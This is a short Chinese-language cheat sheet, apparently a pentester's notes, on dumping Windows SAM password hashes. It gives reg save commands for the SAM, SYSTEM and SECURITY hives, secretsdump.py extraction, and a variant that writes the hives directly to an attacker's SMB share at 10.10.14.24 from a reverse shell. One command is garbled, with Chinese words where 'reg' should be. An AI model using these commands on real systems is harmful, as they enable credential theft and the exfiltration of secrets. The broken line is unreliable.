---
description: 有两种取法，一般只取两个
---

# 转储sam

1. 取两个

```clike
比较麻烦 save HKLM\sam sam
reg save HKLM\system sys

download sys
download sam
secretsdump.py -sam sam -system sys LOCAL
```

1. 或者取三个

用于我们只有反弹高权限shell，但是没有凭据 下面的例子我已经建立了一个简单的smbshare

```clike
reg save HKLM\sam \\10.10.14.24\share\sam
reg save HKLM\system \\10.10.14.24\share\system
reg save HKLM\security \\10.10.14.24\share\security
secretsdump.py -sam sam -security security -system system LOCAL
```
